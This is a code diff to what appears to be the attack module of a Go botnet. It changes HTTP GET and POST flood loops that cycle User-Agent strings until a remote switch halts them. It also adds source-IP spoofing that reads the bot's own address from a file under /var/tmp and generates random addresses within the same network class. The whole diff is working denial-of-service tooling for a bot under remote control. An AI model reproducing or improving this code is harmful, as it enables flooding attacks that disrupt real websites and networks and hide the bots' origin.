@@ -2,6 +2,7 @@ package lib
 
 import (
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"net/http"
@@ -14,12 +15,12 @@ import (
 	"github.com/google/gopacket/layers"
 )
 
-func sockBuffer(size string) []byte {
-	iSize := convInt(size)
-	if iSize < 50 || iSize > 1400 {
-		iSize = 100
+func sockBuffer(packetSize string) []byte {
+	size := convInt(packetSize)
+	if size < 50 || size > 1400 {
+		size = 100
 	}
-	return make([]byte, iSize)
+	return make([]byte, size)
 }
 
 func rawSocket(rawProtocol int) net.PacketConn {
@@ -91,26 +92,57 @@ func (a *Attack) randDstPort() int {
 
 func (a *Attack) randSrcIP() string {
 	if a.srcAddr == "-r" {
-		var rand []string
-		for i := 0; i < 4; i++ {
-			rand = append(rand, genRange(255, 0), ".")
+		var randArr []string
+		getIP := execComd("tail", "-1", "/var/tmp/"+fileName(true))
+		manageGetIP := strings.Split(getIP, ".")
+
+		manageSrcRange := func(loopTimes, rtnElems, ipElems int) string {
+			/*
+				loop times 4 --> xxx.xxx.xxx.xxx
+				loop times 3 --> 123.xxx.xxx.xxx
+				loop times 2 --> 123.123.xxx.xxx
+				loop times 1 --> 123.123.123.xxx
+			*/
+			if loopTimes < 4 {
+				randArr = append(randArr, strings.Join(manageGetIP[0:ipElems], "."), ".")
+			}
+			for i := 1; i <= loopTimes; i++ {
+				randArr = append(randArr, genRange(255, 0), ".")
+			}
+			randArr[len(randArr)-1] = ""
+			return strings.Join(randArr[0:rtnElems], "")
 		}
-		return strings.Join(rand[0:7], "")
+		convIP := convInt(manageGetIP[0])
+
+		/*
+			Worst case (The bot info file not found).
+		*/
+		if getIP == "Fail to execute command!!!" {
+			return manageSrcRange(4, 7, 0)
+		}
+
+		if convIP < 127 || (convIP >= 225 && convIP <= 239) || (convIP >= 240 && convIP <= 250) {
+			return manageSrcRange(3, 7, 1)
+		} else if convIP >= 128 && convIP <= 191 {
+			return manageSrcRange(2, 5, 2)
+		} else if convIP >= 193 && convIP <= 223 {
+			return manageSrcRange(1, 4, 3)
+		}
 	}
 	return a.srcAddr
 }
 
-func (a *Attack) setupHTTP() (*http.Client, *http.Request) {
-	httpReq, _ := http.NewRequest(a.httpMethod, a.url+"/"+a.reqHeader, nil)
-	return &http.Client{}, httpReq
+func setupHTTP(method, url, header string, body io.Reader) (*http.Client, *http.Request, error) {
+	httpReq, err := http.NewRequest(method, url+header, body)
+	return &http.Client{}, httpReq, err
 }
 
 func (a *Attack) getRequest() {
-	get, usrAgent := a.setupHTTP()
+	get, getReq, reqErr := setupHTTP("GET", a.url, "", a.attackBody)
 	for {
-		for agent := range httpAgent {
-			usrAgent.Header.Set("User-Agent", httpAgent[agent])
-			get.Do(usrAgent)
+		for agent := range httpAgents {
+			getReq.Header.Set("User-Agent", httpAgents[agent])
+			get.Do(getReq)
 			if callSwitch, keySwitch := SetupCaller(); keySwitch {
 				if callSwitch.CallAttack.attackSwitch {
 					break
@@ -118,7 +150,7 @@ func (a *Attack) getRequest() {
 			}
 		}
 		if callSwitch, keySwitch := SetupCaller(); keySwitch {
-			if callSwitch.CallAttack.attackSwitch {
+			if callSwitch.CallAttack.attackSwitch || reqErr != nil {
 				break
 			}
 		}
@@ -126,11 +158,11 @@ func (a *Attack) getRequest() {
 }
 
 func (a *Attack) postRequest() {
-	post, postBody := a.setupHTTP()
+	post, postReq, reqErr := setupHTTP("POST", a.url, "", a.attackBody)
 	for {
-		post.Do(postBody)
+		post.Do(postReq)
 		if callSwitch, keySwitch := SetupCaller(); keySwitch {
-			if callSwitch.CallAttack.attackSwitch {
+			if callSwitch.CallAttack.attackSwitch || reqErr != nil {
 				break
 			}
 		}
